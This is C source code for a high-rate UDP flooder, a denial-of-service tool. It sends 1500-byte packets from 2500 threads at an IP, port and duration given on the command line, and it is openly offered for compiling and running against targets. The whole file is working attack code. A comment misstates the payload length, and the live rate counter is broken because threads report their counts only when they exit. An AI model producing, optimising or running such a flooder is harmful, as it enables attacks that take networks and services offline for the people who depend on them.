// Ultra‑optimized UDP flooder – aims for max PPS (1M target)
// Compile: gcc -pthread -O3 -o flooder flooder_max_pps.c
// Run: ./flooder <IP> <PORT> <TIME_SEC>
// Uses 2500 threads, 1500‑byte packets, custom payload

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/syscall.h>

#define PACKET_SIZE 1500
#define THREAD_COUNT 2500

volatile int running = 1;
unsigned long long total_packets = 0;
pthread_mutex_t counter_mutex = PTHREAD_MUTEX_INITIALIZER;
time_t start_time;

// Your custom payload (first 68 bytes)
const unsigned char original_payload[] = 
    "\x1\xfa\x83\x78\x4e\xc9\x25\x5d\xb7\x92\xfe\x67\xeb\x3a\x70\xb4"
    "\xde\xec\xbf\x09\x58\x86\x62\xb8\x58\x17\xb2\xcb\x1c\x8f\xae\x04"
    "\x2f\xba\x2e\x55\xf3\x26\xc9\x37\x36\xea\x9e\xfb\xb2\xce\x28\x7d"
    "\x97\x13\x45\xf5\xcb\xcd\x3f\xb9\x62\x0b\xff\x02\x69\xdb\x4a\x33"
    "\x52\x83\x67\x1e\x94\xdc\x35\xeb\x20\x94\xcd\xfb\x70\xae\xd3\xb8"
    "\x9c\xbc\xe6\xa6\x61\x73\x18\x46\x18\x5b\xc3\xac\x29\x79\xa6\xbb"
    "\xed\xea\x59\x38\x1c\xa8\x8a\x45\x53\xc0\x06\xea\xbf\x33\x81\xa2"
    "\x35\xb6\x70\x32\x88\xa7\x27\xca\x7e\xcb\xb1\xe3\xee\x34\x5d\xf9"
    "\x49\x9c\x53\xd7\x4f\x71\xcb\x62\xdc\x5e\xd4\x60\x8e\x2e\x9b\x36"
    "\xc6\x11\x26\xa4\xae\x54\x34\xbb\xb3\xbe\xd9\x4b\xaf\x28\x8a\x84"
    "\xae\x17";
const size_t original_len = sizeof(original_payload) - 1;

unsigned char full_payload[PACKET_SIZE];

void build_payload() {
    memcpy(full_payload, original_payload, original_len);
    memset(full_payload + original_len, 'X', PACKET_SIZE - original_len);
}

void* send_loop(void* arg) {
    int thread_id = *(int*)arg;
    int sock;
    struct sockaddr_in target;
    unsigned long long local_counter = 0;
    char ip[16];
    int port, duration;
    
    // Copy thread arguments (passed via global struct would be faster, but for clarity)
    memcpy(ip, (char*)arg + sizeof(int), 16);
    port = *(int*)((char*)arg + sizeof(int) + 16);
    duration = *(int*)((char*)arg + sizeof(int) + 16 + 4);
    
    // Pin thread to a specific CPU core (improves cache locality)
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    // Increase socket send buffer
    int bufsize = 4 * 1024 * 1024; // 4 MB
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    time_t end_time = time(NULL) + duration;
    
    while (running && time(NULL) <= end_time) {
        if (sendto(sock, full_payload, PACKET_SIZE, 0,
                   (struct sockaddr*)&target, sizeof(target)) < 0) {
            // busy loop
        }
        local_counter++;
    }
    
    close(sock);
    
    pthread_mutex_lock(&counter_mutex);
    total_packets += local_counter;
    pthread_mutex_unlock(&counter_mutex);
    
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <TIME_SEC>\n", argv[0]);
        printf("Uses 2500 threads, 1500-byte packets, aims for max PPS (1M target)\n");
        return 1;
    }
    
    build_payload();
    
    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    
    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║    MAX PPS UDP FLOODER - TARGET 1,000,000 pps   ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");
    printf("Target: %s:%d\n", ip, port);
    printf("Duration: %d sec | Threads: %d\n", duration, THREAD_COUNT);
    printf("Packet size: %d bytes\n", PACKET_SIZE);
    printf("Press Ctrl+C to stop.\n\n");
    
    pthread_t threads[THREAD_COUNT];
    // Pack arguments into a single block to avoid per‑thread mallocs
    char* thread_args = malloc(THREAD_COUNT * (sizeof(int) + 16 + 4 + 4));
    if (!thread_args) return 1;
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        char* p = thread_args + i * (sizeof(int) + 16 + 4 + 4);
        *(int*)p = i;  // thread id
        strcpy(p + sizeof(int), ip);
        *(int*)(p + sizeof(int) + 16) = port;
        *(int*)(p + sizeof(int) + 16 + 4) = duration;
        pthread_create(&threads[i], NULL, send_loop, p);
    }
    
    start_time = time(NULL);
    unsigned long long last_total = 0;
    while (time(NULL) - start_time < duration) {
        sleep(1);
        unsigned long long current;
        pthread_mutex_lock(&counter_mutex);
        current = total_packets;
        pthread_mutex_unlock(&counter_mutex);
        unsigned long long delta = current - last_total;
        double mbps = (delta * PACKET_SIZE * 8) / 1e6;
        printf("\r📊 Rate: %llu pps | %.2f Mbps | Total: %llu   ", delta, mbps, current);
        fflush(stdout);
        last_total = current;
    }
    
    running = 0;
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n\n========================================\n");
    printf("✅ Final: %llu packets in %d sec\n", total_packets, duration);
    printf("Average rate: %llu pps\n", total_packets / duration);
    double total_gb = (total_packets * PACKET_SIZE) / (1024.0*1024.0*1024.0);
    printf("Total data: %.2f GB\n", total_gb);
    printf("========================================\n");
    
    free(thread_args);
    return 0;
}
